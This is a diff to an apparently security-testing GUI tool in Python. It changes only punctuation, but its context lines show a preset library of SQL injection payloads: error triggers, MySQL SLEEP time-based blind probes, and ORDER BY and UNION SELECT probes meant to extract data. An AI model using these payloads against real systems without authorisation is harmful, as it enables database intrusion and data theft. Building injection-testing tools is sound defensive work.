@@ -46,7 +46,7 @@ PRESET_LIBRARY = {
     "Error Triggers": {
         "description": "Force the database to reveal error messages",
         "payloads": [
-            ("'",                           "Single quote — simplest test"),
+            ("'",                           "Single quote - simplest test"),
             ("''",                          "Double single quote"),
             ("\"",                          "Double quote"),
             ("\\",                          "Backslash escape"),
@@ -84,7 +84,7 @@ PRESET_LIBRARY = {
     "Time-Based Blind": {
         "description": "Confirm injection by measuring response delay",
         "payloads": [
-            ("'; SLEEP(5)--",               "MySQL SLEEP — 5s"),
+            ("'; SLEEP(5)--",               "MySQL SLEEP - 5s"),
             ("' OR SLEEP(5)--",             "MySQL OR SLEEP"),
             ("' AND SLEEP(5)--",            "MySQL AND SLEEP"),
             ("1; SLEEP(5)--",               "Numeric prefix SLEEP"),
@@ -102,9 +102,9 @@ PRESET_LIBRARY = {
     "Union Extraction": {
         "description": "Pull real data out once injection is confirmed",
         "payloads": [
-            ("' ORDER BY 1--",              "Column count probe — 1"),
-            ("' ORDER BY 2--",              "Column count probe — 2"),
-            ("' ORDER BY 3--",              "Column count probe — 3"),
+            ("' ORDER BY 1--",              "Column count probe - 1"),
+            ("' ORDER BY 2--",              "Column count probe - 2"),
+            ("' ORDER BY 3--",              "Column count probe - 3"),
             ("' UNION SELECT NULL--",        "1-column NULL probe"),
             ("' UNION SELECT NULL,NULL--",   "2-column NULL probe"),
             ("' UNION SELECT NULL,NULL,NULL--","3-column NULL probe"),
@@ -743,7 +743,7 @@ class PayloadLabTab(QWidget):
 
         self.payload_editor = QTextEdit()
         self.payload_editor.setPlaceholderText(
-            "One payload per line — paste, type, or double-click presets from the library\n\n"
+            "One payload per line - paste, type, or double-click presets from the library\n\n"
             "Examples:\n"
             "' OR 1=1--\n"
             "' UNION SELECT sqlite_version(),NULL--\n"
@@ -1100,9 +1100,9 @@ class PayloadLabTab(QWidget):
         flagged = sum(1 for r in self._results if r.get("flagged"))
         clean   = total - flagged
         self.run_status.setText(
-            f"Done — {total} payloads  |  {flagged} flagged  |  {clean} clean"
-            + ("  —  Click any flagged row to see the response." if flagged
-               else "  —  No issues detected with these payloads.")
+            f"Done - {total} payloads  |  {flagged} flagged  |  {clean} clean"
+            + ("  -  Click any flagged row to see the response." if flagged
+               else "  -  No issues detected with these payloads.")
         )
         self._run_finished()
 
